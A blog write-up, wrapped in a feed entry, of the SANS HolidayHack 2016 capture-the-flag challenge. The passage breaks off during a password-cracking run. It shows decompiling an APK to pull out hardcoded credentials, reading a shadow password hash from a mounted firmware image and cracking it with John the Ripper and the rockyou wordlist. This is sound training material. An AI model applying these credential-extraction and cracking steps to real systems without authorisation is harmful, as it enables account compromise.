{"code":1,"isDone":false,"toInsertArticleList":[{"createdTime":"2020-09-21 02:30:39","updatedTime":"2020-09-21 02:30:39","title":"SANS HolidayHack 2016 Full Writeup","link":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016","description":"<p>Another year has past, which means the <a href=\"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/www.holidayhackchallenge.com\">SANS HolidayHack</a> is in full swing. This year, many new technologies were used, which were a blast to dig into. This writeup dives into each challenge and the methodology used to solve it. A summary of the story this year is below</p> \n<ul id=\"markdown-toc\"> \n <li><a href=\"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#part-1-a-most-curious-business-card\" id=\"markdown-toc-part-1-a-most-curious-business-card\">Part 1: A Most Curious Business Card</a> \n  <ul> \n   <li><a href=\"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#part-11-instagram\" id=\"markdown-toc-part-11-instagram\">Part 1.1: Instagram</a></li> \n   <li><a href=\"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#part-12-twitter\" id=\"markdown-toc-part-12-twitter\">Part 1.2: Twitter</a></li> \n   <li><a href=\"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#1-what-is-the-secret-message-in-santas-tweets\" id=\"markdown-toc-1-what-is-the-secret-message-in-santas-tweets\">1) What is the secret message in Santa’s tweets?</a></li> \n   <li><a href=\"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#2-what-is-inside-the-zip-file-distributed-by-santas-team\" id=\"markdown-toc-2-what-is-inside-the-zip-file-distributed-by-santas-team\">2) What is inside the ZIP file distributed by Santa’s team?</a></li> \n  </ul> </li> \n <li><a href=\"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#part-2-awesome-package-konveyance\" id=\"markdown-toc-part-2-awesome-package-konveyance\">Part 2: Awesome Package Konveyance</a> \n  <ul> \n   <li><a href=\"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#3-what-username-and-password-are-embedded-in-the-apk-file\" id=\"markdown-toc-3-what-username-and-password-are-embedded-in-the-apk-file\">3) What username and password are embedded in the APK file?</a></li> \n   <li><a href=\"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#4-what-is-the-name-of-the-audible-component-audio-file-in-the-santagram-apk-file\" id=\"markdown-toc-4-what-is-the-name-of-the-audible-component-audio-file-in-the-santagram-apk-file\">4) What is the name of the audible component (audio file) in the SantaGram APK file?</a></li> \n  </ul> </li> \n <li><a href=\"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#part-3-a-fresh-baked-holiday-pi\" id=\"markdown-toc-part-3-a-fresh-baked-holiday-pi\">Part 3: A Fresh-Baked Holiday Pi</a> \n  <ul> \n   <li><a href=\"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#5-what-is-the-password-for-the-cranpi-account-on-the-cranberry-pi-system\" id=\"markdown-toc-5-what-is-the-password-for-the-cranpi-account-on-the-cranberry-pi-system\">5) What is the password for the “cranpi” account on the Cranberry Pi system?</a></li> \n   <li><a href=\"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#61-how-did-you-open-each-terminal-door\" id=\"markdown-toc-61-how-did-you-open-each-terminal-door\">6.1) How did you open each terminal door…</a> \n    <ul> \n     <li><a href=\"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#elf-house-2---to-open-the-door-find-both-parts-of-the-passphrase-inside-the-outpcap-file\" id=\"markdown-toc-elf-house-2---to-open-the-door-find-both-parts-of-the-passphrase-inside-the-outpcap-file\">Elf House #2 - To open the door, find both parts of the passphrase inside the /out.pcap file</a></li> \n     <li><a href=\"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#workshop-1---to-open-the-door-find-the-passphrase-file-deep-in-the-directories\" id=\"markdown-toc-workshop-1---to-open-the-door-find-the-passphrase-file-deep-in-the-directories\">Workshop #1 - To open the door, find the passphrase file deep in the directories.</a></li> \n     <li><a href=\"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#santas-office---greetings-professor-falken\" id=\"markdown-toc-santas-office---greetings-professor-falken\">Santa’s Office - GREETINGS PROFESSOR FALKEN.</a></li> \n     <li><a href=\"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#workshop-2---find-the-passphrase-from-the-wumpus--play-fair-or-cheat-its-up-to-you\" id=\"markdown-toc-workshop-2---find-the-passphrase-from-the-wumpus--play-fair-or-cheat-its-up-to-you\">Workshop #2 - Find the passphrase from the wumpus. Play fair or cheat; it’s up to you.</a></li> \n     <li><a href=\"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#workshop--train-station---train-management-console\" id=\"markdown-toc-workshop--train-station---train-management-console\">Workshop – Train Station - Train Management Console</a></li> \n    </ul> </li> \n   <li><a href=\"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#62-and-where-had-the-villain-imprisoned-santa\" id=\"markdown-toc-62-and-where-had-the-villain-imprisoned-santa\">6.2) …and where had the villain imprisoned Santa?</a></li> \n  </ul> </li> \n <li><a href=\"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#part-4-my-gosh-its-full-of-holes\" id=\"markdown-toc-part-4-my-gosh-its-full-of-holes\">Part 4: My Gosh… It’s Full of Holes</a> \n  <ul> \n   <li><a href=\"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#71-the-mobile-analytics-server-via-credentialed-login-access\" id=\"markdown-toc-71-the-mobile-analytics-server-via-credentialed-login-access\">7.1) The Mobile Analytics Server (via credentialed login access)</a></li> \n   <li><a href=\"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#72-the-dungeon-game\" id=\"markdown-toc-72-the-dungeon-game\">7.2) The Dungeon Game</a></li> \n   <li><a href=\"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#73-the-debug-server\" id=\"markdown-toc-73-the-debug-server\">7.3) The Debug Server</a></li> \n   <li><a href=\"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#74-the-banner-ad-server\" id=\"markdown-toc-74-the-banner-ad-server\">7.4) The Banner Ad Server</a></li> \n   <li><a href=\"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#75-the-uncaught-exception-handler-server\" id=\"markdown-toc-75-the-uncaught-exception-handler-server\">7.5) The Uncaught Exception Handler Server</a></li> \n   <li><a href=\"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#76-the-mobile-analytics-server-post-authentication\" id=\"markdown-toc-76-the-mobile-analytics-server-post-authentication\">7.6) The Mobile Analytics Server (post authentication)</a> \n    <ul> \n     <li><a href=\"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#administrator-access\" id=\"markdown-toc-administrator-access\">Administrator access</a></li> \n     <li><a href=\"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#retrieving-the-treasure\" id=\"markdown-toc-retrieving-the-treasure\">Retrieving the treasure</a></li> \n    </ul> </li> \n   <li><a href=\"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#8-what-are-the-names-of-the-audio-files-you-discovered-from-each-system-above\" id=\"markdown-toc-8-what-are-the-names-of-the-audio-files-you-discovered-from-each-system-above\">8) What are the names of the audio files you discovered from each system above?</a></li> \n  </ul> </li> \n <li><a href=\"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#part-5-discombobulated-audio\" id=\"markdown-toc-part-5-discombobulated-audio\">Part 5: Discombobulated Audio</a> \n  <ul> \n   <li><a href=\"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#9-who-is-the-villain-behind-the-nefarious-plot\" id=\"markdown-toc-9-who-is-the-villain-behind-the-nefarious-plot\">9) Who is the villain behind the nefarious plot.</a></li> \n   <li><a href=\"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#10-why-had-the-villain-abducted-santa\" id=\"markdown-toc-10-why-had-the-villain-abducted-santa\">10) Why had the villain abducted Santa?</a></li> \n  </ul> </li> \n <li><a href=\"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#bonus-features---dungeon-game-20\" id=\"markdown-toc-bonus-features---dungeon-game-20\">BONUS FEATURES - Dungeon Game 2.0</a> \n  <ul> \n   <li><a href=\"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#bonus-1---reversing-the-encryption-of-the-dungeon-game\" id=\"markdown-toc-bonus-1---reversing-the-encryption-of-the-dungeon-game\">BONUS 1 - Reversing the encryption of The Dungeon Game</a></li> \n   <li><a href=\"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#bonus-2---adding-the-decrypted-strings-to-binary-ninja\" id=\"markdown-toc-bonus-2---adding-the-decrypted-strings-to-binary-ninja\">BONUS 2 - Adding the decrypted strings to Binary Ninja</a></li> \n  </ul> </li> \n</ul> \n<div class=\"highlighter-rouge\"> \n <div class=\"highlight\"> \n  <pre class=\"highlight\"><code>Sitting restless in their bed on Christmas Eve, Josh and Jess Dosis hear Santa work his magic downstairs in their living room. After Santa gave his \"Ho Ho Ho\", Josh and Jess heard a loud \"Oooomph!\" followed by a scuffle of sorts and then... nothing. Josh and Jess hurry to the living room to only see Santa's big blue sack. Jess realizes that Snata has been abducted. The only thing left was Santa's business card.\n</code></pre> \n </div> \n</div> \n<p>This business card is the start of the journey of the HolidayHack.</p> \n<h1 id=\"part-1-a-most-curious-business-card\">Part 1: A Most Curious Business Card</h1> \n<p><img src=\"http://ctfhacker.com/assets/images/holidayhack2016/business-card.gif\" alt=\"test.gif\" /></p> \n<p>We see Santa Claus as two different social media accounts:</p> \n<ul> \n <li>Twitter: @santawclaus</li> \n <li>Instagram: @santawclaus</li> \n</ul> \n<p>Visiting each of these accounts could prove profitable.</p> \n<h3 id=\"part-11-instagram\">Part 1.1: Instagram</h3> \n<p>One of the images from Instagram is below:</p> \n<p><img src=\"http://ctfhacker.com/assets/images/holidayhack2016/instagram.jpg\" alt=\"instagram.jpg\" /></p> \n<p>Besides the mess on the table, two pieces of information stand out in the photo:</p> \n<p>A URL: www.northpolewonderland.com <img src=\"http://ctfhacker.com/assets/images/holidayhack2016/instagram_1_x6.jpg\" alt=\"instagram_1.jpg\" /></p> \n<p>A File: SantaGram_v4.2.zip <img src=\"http://ctfhacker.com/assets/images/holidayhack2016/instagram_2_x6.jpg\" alt=\"instagram_2.jpg\" /></p> \n<p>Using the popular tool <code class=\"highlighter-rouge\">wget</code>, we can download this file locally: <code class=\"highlighter-rouge\">wget http://northpolewonderland.com/SantaGram_v4.2.zip</code>. Attempting to <code class=\"highlighter-rouge\">unzip</code> this file shows that the file is password protected.</p> \n<script type=\"text/javascript\" src=\"https://asciinema.org/a/0jj9o17udn55d006pimfdwkbj.js\" id=\"asciicast-0jj9o17udn55d006pimfdwkbj\" async=\"\"></script> \n<p>Let’s see if the Twitter handle has anything useful we could use as a password for this zip file.</p> \n<h3 id=\"part-12-twitter\">Part 1.2: Twitter</h3> \n<p>We begin by looking at Santa’s tweets at his handle of @santawclaus:</p> \n<p><img src=\"http://ctfhacker.com/assets/images/holidayhack2016/tweets.png\" alt=\"tweets.png\" /></p> \n<p>These look a bit like gibberish. Let’s try to print all of the tweets and see if we see anything useful. The <code class=\"highlighter-rouge\">tweepy</code> Python package makes this process very simple.</p> \n<p>In order to use <code class=\"highlighter-rouge\">tweepy</code>, we need to retrieve API access tokens from our Twitter account. <a href=\"https://dev.twitter.com/oauth/overview/application-owner-access-tokens\">This page</a> gives a great tutorial on how to create a new application. This new application gives specific access tokens used by <code class=\"highlighter-rouge\">tweepy</code> to authenticate to Twitter.</p> \n<p>Now that we have our access tokens, let’s prepare our environment to use <code class=\"highlighter-rouge\">tweepy</code>. In order to isolate our workspace to only <code class=\"highlighter-rouge\">tweepy</code>, we can use <code class=\"highlighter-rouge\">virtualenv</code>. This way, we won’t clutter our system Python packages. We can also use <a href=\"http://virtualenvwrapper.readthedocs.io/en/latest/install.html\">virtualenvwrapper</a> to provide an easy interface for working with these enviroments.</p> \n<p>Installing <code class=\"highlighter-rouge\">tweepy</code> now is a breeze:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\"><span class=\"n\">ctfhacker</span> at <span class=\"mi\">barberpole</span> in <span class=\"k\">~</span> on <span class=\"kc\">master</span>:\nmkvirtualenv tweepy\n\n<span class=\"n\">(tweepy) ctfhacker</span> at <span class=\"mi\">barberpole</span> in <span class=\"k\">~</span> on <span class=\"kc\">master</span>:\n$ pip install tweepy\n</code></pre> \n</figure> \n<p>The prefix of <code class=\"highlighter-rouge\">(tweepy)</code> confirms that we are now in a isolated environment for <code class=\"highlighter-rouge\">tweepy</code>. If we need to leave this <code class=\"highlighter-rouge\">virtualenv</code> in the future, we can <code class=\"highlighter-rouge\">deactivate</code> it to return to using the system Python packages.</p> \n<p>We can use <code class=\"highlighter-rouge\">tweepy</code> to retrieve tweets of one user using the following API:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-python\" data-lang=\"python\"><span class=\"kn\">import</span> <span class=\"nn\">tweepy</span>\n<span class=\"kn\">import</span> <span class=\"nn\">csv</span>\n\n<span class=\"n\">ckey</span> <span class=\"o\">=</span> <span class=\"s\">'!!!'</span>\n<span class=\"n\">csecret</span> <span class=\"o\">=</span> <span class=\"s\">'@@@'</span>\n<span class=\"n\">atoken</span> <span class=\"o\">=</span> <span class=\"s\">'###'</span>\n<span class=\"n\">asecret</span> <span class=\"o\">=</span> <span class=\"s\">'$$$'</span>\n\n<span class=\"n\">auth</span> <span class=\"o\">=</span> <span class=\"n\">tweepy</span><span class=\"o\">.</span><span class=\"n\">OAuthHandler</span><span class=\"p\">(</span><span class=\"n\">ckey</span><span class=\"p\">,</span> <span class=\"n\">csecret</span><span class=\"p\">)</span>\n<span class=\"n\">auth</span><span class=\"o\">.</span><span class=\"n\">set_access_token</span><span class=\"p\">(</span><span class=\"n\">atoken</span><span class=\"p\">,</span> <span class=\"n\">asecret</span><span class=\"p\">)</span>\n<span class=\"n\">api</span> <span class=\"o\">=</span> <span class=\"n\">tweepy</span><span class=\"o\">.</span><span class=\"n\">API</span><span class=\"p\">(</span><span class=\"n\">auth</span><span class=\"p\">)</span>\n\n<span class=\"n\">tweets</span> <span class=\"o\">=</span> <span class=\"n\">api</span><span class=\"o\">.</span><span class=\"n\">user_timeline</span><span class=\"p\">(</span><span class=\"n\">screen_name</span><span class=\"o\">=</span><span class=\"s\">'santawclaus'</span><span class=\"p\">,</span> <span class=\"n\">count</span><span class=\"o\">=</span><span class=\"mi\">350</span><span class=\"p\">)</span>\n\n<span class=\"k\">for</span> <span class=\"n\">tweet</span> <span class=\"ow\">in</span> <span class=\"n\">tweets</span><span class=\"p\">:</span>\n    <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"n\">tweet</span><span class=\"o\">.</span><span class=\"n\">text</span><span class=\"p\">)</span></code></pre> \n</figure> \n<p>The tweets could have a hint as to what the password could be for the SantaGram zip file.</p> \n<script type=\"text/javascript\" src=\"https://asciinema.org/a/2sv1ozs9etd0547z8bk3fr2mt.js\" id=\"asciicast-2sv1ozs9etd0547z8bk3fr2mt\" async=\"\"></script> \n<p>So BUGBO isn’t the right password. Just to be sure, let’s check how many tweets we retrieved via <code class=\"highlighter-rouge\">user_timeline</code>.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-python\" data-lang=\"python\"><span class=\"c\"># Twitter shows Santa has tweeted 350 times</span>\n<span class=\"n\">tweets</span> <span class=\"o\">=</span> <span class=\"n\">api</span><span class=\"o\">.</span><span class=\"n\">user_timeline</span><span class=\"p\">(</span><span class=\"n\">screen_name</span><span class=\"o\">=</span><span class=\"s\">'santawclaus'</span><span class=\"p\">,</span> <span class=\"n\">count</span><span class=\"o\">=</span><span class=\"mi\">350</span><span class=\"p\">)</span>\n<span class=\"k\">print</span><span class=\"p\">(</span><span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"n\">tweets</span><span class=\"p\">))</span></code></pre> \n</figure> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\"><span class=\"n\">(tweepy) ctfhacker</span> at <span class=\"mi\">barberpole</span> in <span class=\"k\">1-santatweets</span> on <span class=\"kc\">master</span>\npython win.py\n200\n</code></pre> \n</figure> \n<p>200?! Hmm.. the API must limit to 200 tweets pre request. Looking at the API for <a href=\"http://docs.tweepy.org/en/v3.5.0/api.html#API.user_timeline\">user_timeline</a> shows that we can retrieve other tweets using the <code class=\"highlighter-rouge\">max_id</code> keyword argument. Let’s ask for the other 150 after our last tweet.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-python\" data-lang=\"python\"><span class=\"n\">tweets</span> <span class=\"o\">=</span> <span class=\"n\">api</span><span class=\"o\">.</span><span class=\"n\">user_timeline</span><span class=\"p\">(</span><span class=\"n\">screen_name</span><span class=\"o\">=</span><span class=\"s\">'santawclaus'</span><span class=\"p\">,</span> <span class=\"n\">count</span><span class=\"o\">=</span><span class=\"mi\">350</span><span class=\"p\">)</span>\n<span class=\"n\">all_tweets</span> <span class=\"o\">=</span> <span class=\"nb\">list</span><span class=\"p\">(</span><span class=\"n\">tweets</span><span class=\"p\">)</span>\n<span class=\"c\"># Save last_id</span>\n<span class=\"n\">last_id</span> <span class=\"o\">=</span> <span class=\"n\">all_tweets</span><span class=\"p\">[</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">]</span><span class=\"o\">.</span><span class=\"nb\">id</span>\n\n<span class=\"c\"># Use `max_id` to get tweets after last_id</span>\n<span class=\"n\">tweets</span> <span class=\"o\">=</span> <span class=\"n\">api</span><span class=\"o\">.</span><span class=\"n\">user_timeline</span><span class=\"p\">(</span><span class=\"n\">screen_name</span><span class=\"o\">=</span><span class=\"s\">'santawclaus'</span><span class=\"p\">,</span> <span class=\"n\">count</span><span class=\"o\">=</span><span class=\"mi\">350</span><span class=\"p\">,</span> <span class=\"n\">max_id</span><span class=\"o\">=</span><span class=\"n\">last_id</span><span class=\"p\">)</span>\n<span class=\"n\">all_tweets</span><span class=\"o\">.</span><span class=\"n\">extend</span><span class=\"p\">(</span><span class=\"n\">tweets</span><span class=\"p\">)</span>\n\n<span class=\"c\"># Print everything</span>\n<span class=\"k\">for</span> <span class=\"n\">tweet</span> <span class=\"ow\">in</span> <span class=\"n\">all_tweets</span><span class=\"p\">:</span>\n    <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"n\">tweet</span><span class=\"o\">.</span><span class=\"n\">text</span><span class=\"p\">)</span></code></pre> \n</figure> \n<p>Let’s see what the other tweets have in store:</p> \n<script type=\"text/javascript\" src=\"https://asciinema.org/a/8k2pqh7gmc6pn602mv8ytcqic.js\" id=\"asciicast-8k2pqh7gmc6pn602mv8ytcqic\" async=\"\"></script> \n<p>Ah, BUGBOUNTY was the password. And now we have the SantaGram APK! This gives us the answers to the first two questions..</p> \n<h3 id=\"1-what-is-the-secret-message-in-santas-tweets\">1) What is the secret message in Santa’s tweets?</h3> \n<div class=\"highlighter-rouge\"> \n <div class=\"highlight\"> \n  <pre class=\"highlight\"><code>BUGBOUNTY\n</code></pre> \n </div> \n</div> \n<h3 id=\"2-what-is-inside-the-zip-file-distributed-by-santas-team\">2) What is inside the ZIP file distributed by Santa’s team?</h3> \n<div class=\"highlighter-rouge\"> \n <div class=\"highlight\"> \n  <pre class=\"highlight\"><code>SantaGram APK\n</code></pre> \n </div> \n</div> \n<p>Now that we have the APK, let’s move on to Part 2!</p> \n<h1 id=\"part-2-awesome-package-konveyance\">Part 2: Awesome Package Konveyance</h1> \n<p>Our task now is to find a username/password combination in the APK. It is possible to retrieve decompiled source of the APK using <a href=\"https://github.com/skylot/jadx\">jadx</a>. After installing <code class=\"highlighter-rouge\">jadx</code>, executing it over our APK is simple:</p> \n<div class=\"highlighter-rouge\"> \n <div class=\"highlight\"> \n  <pre class=\"highlight\"><code>~/workspace/jadx/build/jadx/bin/jadx SantaGram_v4.2.apk\n</code></pre> \n </div> \n</div> \n<p>Using <code class=\"highlighter-rouge\">grep</code> would be just fine, but <a href=\"https://github.com/ggreer/the_silver_searcher\">Silver Searcher</a> is absolutely amazing and fast. After installing <code class=\"highlighter-rouge\">the_silver_searcher</code>, we can search the entire code base:</p> \n<div class=\"highlighter-rouge\"> \n <div class=\"highlight\"> \n  <pre class=\"highlight\"><code>ag -C5 password SantaGram_4.2\n</code></pre> \n </div> \n</div> \n<p>Using <code class=\"highlighter-rouge\">-C5</code> we want to display 5 lines of context around our match of <code class=\"highlighter-rouge\">password</code>. In our results, we have the following:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\"><span class=\"n\">SantaGram_4</span><span class=\"o\">.</span><span class=\"mi\">2</span><span class=\"o\">/</span><span class=\"n\">com</span><span class=\"o\">/</span><span class=\"n\">northpolewonderland</span><span class=\"o\">/</span><span class=\"n\">santagram</span><span class=\"o\">/</span><span class=\"n\">b</span><span class=\"o\">.</span><span class=\"na\">java</span>\n<span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">a</span><span class=\"o\">(</span><span class=\"kd\">final</span> <span class=\"n\">Context</span> <span class=\"n\">context</span><span class=\"o\">,</span> <span class=\"n\">String</span> <span class=\"n\">str</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n<span class=\"kd\">final</span> <span class=\"n\">JSONObject</span> <span class=\"n\">jSONObject</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">JSONObject</span><span class=\"o\">();</span>\n<span class=\"k\">try</span> <span class=\"o\">{</span>\n        <span class=\"n\">jSONObject</span><span class=\"o\">.</span><span class=\"na\">put</span><span class=\"o\">(</span><span class=\"s\">\"username\"</span><span class=\"o\">,</span> <span class=\"s\">\"guest\"</span><span class=\"o\">);</span>\n        <span class=\"n\">jSONObject</span><span class=\"o\">.</span><span class=\"na\">put</span><span class=\"o\">(</span><span class=\"s\">\"password\"</span><span class=\"o\">,</span> <span class=\"s\">\"busyreindeer78\"</span><span class=\"o\">);</span>\n        <span class=\"n\">jSONObject</span><span class=\"o\">.</span><span class=\"na\">put</span><span class=\"o\">(</span><span class=\"s\">\"type\"</span><span class=\"o\">,</span> <span class=\"s\">\"usage\"</span><span class=\"o\">);</span>\n        <span class=\"n\">jSONObject</span><span class=\"o\">.</span><span class=\"na\">put</span><span class=\"o\">(</span><span class=\"s\">\"activity\"</span><span class=\"o\">,</span> <span class=\"n\">str</span><span class=\"o\">);</span></code></pre> \n</figure> \n<p>And here we have the answer of our next question:</p> \n<h3 id=\"3-what-username-and-password-are-embedded-in-the-apk-file\">3) What username and password are embedded in the APK file?</h3> \n<div class=\"highlighter-rouge\"> \n <div class=\"highlight\"> \n  <pre class=\"highlight\"><code>guest / busyreindeer78\n</code></pre> \n </div> \n</div> \n<p>Now we need to find an embedded audio file in the APK. In order to retrieve the data in the APK, we can use <a href=\"https://ibotpeaches.github.io/Apktool/\">apktool</a>. Extracting data using <code class=\"highlighter-rouge\">apktool</code> can be done as follows:</p> \n<div class=\"highlighter-rouge\"> \n <div class=\"highlight\"> \n  <pre class=\"highlight\"><code>apktool d SantaGram_v4.2.apk\n</code></pre> \n </div> \n</div> \n<p>Using a simple <code class=\"highlighter-rouge\">find</code> command in the resulting directory for various audio file extensions will surely find our hidden audio file:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\"><span class=\"n\">root</span> at <span class=\"mi\">epictreasure</span> in <span class=\"k\">~/host-share/holidayhack2016/1-santatweets</span> on <span class=\"kc\">master</span>\n$ cd SantaGram_4.2\n<span class=\"n\">root</span> at <span class=\"mi\">epictreasure</span> in <span class=\"k\">~/host-share/holidayhack2016/1-santatweets/SantaGram_4.2</span> on <span class=\"kc\">master</span>\n$ find . -name \\*mp3\n./res/raw/discombobulatedaudio1.mp3\n</code></pre> \n</figure> \n<p>And we have the answer to question 4!</p> \n<h3 id=\"4-what-is-the-name-of-the-audible-component-audio-file-in-the-santagram-apk-file\">4) What is the name of the audible component (audio file) in the SantaGram APK file?</h3> \n<div class=\"highlighter-rouge\"> \n <div class=\"highlight\"> \n  <pre class=\"highlight\"><code>discombobulatedaudio1.mp3\n</code></pre> \n </div> \n</div> \n<p>Almost half way there! Onward we go!</p> \n<h1 id=\"part-3-a-fresh-baked-holiday-pi\">Part 3: A Fresh-Baked Holiday Pi</h1> \n<p>In order to progress in the Quest, we have to find all of the pieces to our Cranberry Pi. After finding all of the pieces in game, we now have access to the Cranberry image as well as various terminals, also in game. Our next task is to retrieve the password for the cranpi account on the image.</p> \n<p>Let’s take a look at what is in the Cranberry Pi image. A very handy tool when looking at firmware images is <a href=\"http://binwalk.org/\">binwalk</a>. <code class=\"highlighter-rouge\">binwalk</code> attempts to extract various file types by looking for byte sequences specific to particular file formats. Extracting the image using <code class=\"highlighter-rouge\">binwalk</code> is a breeze:</p> \n<div class=\"highlighter-rouge\"> \n <div class=\"highlight\"> \n  <pre class=\"highlight\"><code>binwalk -e cranbian-jessie.img\n</code></pre> \n </div> \n</div> \n<p>There are a few false positives, but we can look for any extracted file systems:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\"><span class=\"n\">root</span> at <span class=\"mi\">epictreasure</span> in <span class=\"k\">cranberry-pi-image</span> on <span class=\"kc\">master</span>*\n$ cd _cranbian-jessie.img.extracted/\n<span class=\"n\">root</span> at <span class=\"mi\">epictreasure</span> in <span class=\"k\">cranberry-pi-image/_cranbian-jessie.img.extracted</span> on <span class=\"kc\">master</span>*\n$ find . | xargs file | ag filesystem\n./4300000.ext:  Linux rev 1.0 ext4 filesystem data, UUID=3598ef8e-09be-47ef-9d01-f24cf61dff1d\n</code></pre> \n</figure> \n<p>We have one file system. Let’s mount it and examine the innerds.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\"><span class=\"n\">root</span> at <span class=\"mi\">epictreasure</span> in <span class=\"k\">cranberry-pi-image/_cranbian-jessie.img.extracted</span> on <span class=\"kc\">master</span>*\n$ mkdir image_fs\n<span class=\"n\">root</span> at <span class=\"mi\">epictreasure</span> in <span class=\"k\">cranberry-pi-image/_cranbian-jessie.img.extracted</span> on <span class=\"kc\">master</span>*\n$ mount 4300000.ext image_fs/\n<span class=\"n\">root</span> at <span class=\"mi\">epictreasure</span> in <span class=\"k\">cranberry-pi-image/_cranbian-jessie.img.extracted</span> on <span class=\"kc\">master</span>*\n$ ls image_fs/\nbin  boot  dev  etc  home  lib  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var\n</code></pre> \n</figure> \n<p>Bazinga! Now that we have the filesystem mounted, let’s see if we have an <code class=\"highlighter-rouge\">etc/shadow</code> file which could contain the encrypted <code class=\"highlighter-rouge\">cranpi</code> account password</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\"><span class=\"n\">root</span> at <span class=\"mi\">epictreasure</span> in <span class=\"k\">cranberry-pi-image/_cranbian-jessie.img.extracted</span> on <span class=\"kc\">master</span>*\n$ cd image_fs/\n<span class=\"n\">root</span> at <span class=\"mi\">epictreasure</span> in <span class=\"k\">cranberry-pi-image/_cranbian-jessie.img.extracted</span> on <span class=\"kc\">master</span>*\n$ ag cranpi etc/shadow\n28:cranpi:$6$2AXLbEoG$zZlWSwrUSD02cm8ncL6pmaYY/39DUai3OGfnBbDNjtx2G99qKbhnidxinanEhahBINm/2YyjFihxg7tgc343b0:17139:0:99999:7:::\n</code></pre> \n</figure> \n<p>With our encrypted password in hand, let’s use <a href=\"http://www.openwall.com/john\">john the ripper</a> to crack this password using the <a href=\"http://downloads.skullsecurity.org/passwords/rockyou.txt.bz2\">rockyou.txt</a> wordlist.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\"><span class=\"n\">root</span> at <span class=\"mi\">epictreasure</span> in <span class=\"k\">cranberry-pi-image/_cranbian-jessie.img.extracted</span> on <span class=\"kc\">master</span>\n$ tail -n1 etc/shadow &gt; cranpi-hash\n<span class=\"n\">root</span> at <span class=\"mi\">epictreasure</span> in <span class=\"k\">cranberry-pi-image/_cranbian-jessie.img.extracted</span> on <span class=\"kc\">master</span>\n$ ./john --wordlist=rockyou.txt cranpi-hash                                                                      \nLoaded 1 password hash (crypt, generic crypt(3) [?/64])\nPress 'q' or Ctrl-C to abort, almost any other key for status\n0g 0:00:00:02 0% 0g/s 350.6p/s 350.6c/s 350.6C/s football1..felipe\n0g 0:00:01:31 0% 0g/s 345.9p/s 345.9c/s 345.9C/s komang..eleonor\n0g 0:00:02:26 0% 0g/s 343.7p/s 343.7c/s 343.7C/s 122282..071690\n0g 0:00:03:24 0% 0g/s 